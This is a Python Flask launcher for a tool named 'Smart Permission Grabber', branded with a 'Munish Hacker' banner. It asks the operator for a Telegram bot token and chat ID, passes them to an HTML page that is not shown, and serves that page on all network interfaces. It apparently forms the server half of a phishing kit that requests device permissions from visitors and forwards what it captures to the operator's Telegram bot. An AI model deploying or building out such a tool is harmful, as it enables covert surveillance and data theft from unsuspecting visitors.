import os
from flask import Flask, render_template, request

app = Flask(__name__)

# --- Munish Hacker Banner ---
def banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    print("""
    \033[1;32m
     __  __             _     _      _    _            _             
    |  \/  |           (_)   | |    | |  | |          | |            
    | \  / |_   _ _ __  _ ___| |__  | |__| | __ _  ___| | _____ _ __ 
    | |\/| | | | | '_ \| / __| '_ \ |  __  |/ _` |/ __| |/ / _ \ '__|
    | |  | | |_| | | | | \__ \ | | || |  | | (_| | (__|   <  __/ |   
    |_|  |_|\__,_|_| |_|_|___/_| |_||_|  |_|\__,_|\___|_|\_\___|_|   
    
    \033[1;31m[+] Developer: Munish Kumar
    \033[1;34m[+] Tool: Smart Permission Grabber
    \033[1;37m------------------------------------------------------------
    """)

# --- यहाँ हम रन करते समय इनपुट मांगेंगे ---
banner()
token = input("\033[1;33m[?] Enter your Bot Token: \033[0m")
chatid = input("\033[1;33m[?] Enter your Chat ID: \033[0m")
print("\033[1;32m\n[*] Configurations Saved! Starting Server...\033[0m")

@app.route('/')
def index():
    # यहाँ हम HTML को टोकन और आईडी भेज रहे हैं
    return render_template('index.html', bot_token=token, chat_id=chatid)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
